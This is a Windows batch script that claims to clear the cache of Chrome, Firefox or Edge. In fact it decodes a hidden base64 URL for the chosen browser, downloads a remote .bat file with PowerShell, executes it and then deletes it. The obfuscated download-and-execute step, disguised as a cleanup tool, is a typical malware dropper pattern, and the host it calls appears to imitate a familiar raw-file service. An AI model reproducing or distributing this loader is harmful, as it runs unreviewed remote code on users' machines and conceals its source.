@echo off
echo ===========================================
echo   Clear Browser Cache Launcher
echo ===========================================
echo Choose browser to clear cache:
echo 1. Chrome
echo 2. Firefox
echo 3. Edge
echo ===========================================
set /p choice="Enter 1, 2, or 3: "

if "%choice%"=="1" (
    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1jaHJvbWUtY2FjaGUuYmF0
) else if "%choice%"=="2" (
    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1maXJlZm94LWNhY2hlLmJhdA==
) else if "%choice%"=="3" (
    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1jYWNoZS1zY3JpcHQvbWFpbi9jbGVhci1lZGdlLWNhY2hlLmJhdA==
) else (
    echo Invalid choice. Exiting...
    pause
    exit /b
)

for /f "delims=" %%i in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%encodedUrl%'))"') do set SCRIPT_URL=%%i

set TEMP_SCRIPT=%temp%\clear-browser-latest.bat

powershell -Command "try { Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%TEMP_SCRIPT%' -UseBasicParsing } catch { exit 1 }"

if exist "%TEMP_SCRIPT%" (
    call "%TEMP_SCRIPT%"
    del "%TEMP_SCRIPT%"
) else (
    echo Failed to fetch the latest script.
    pause
)
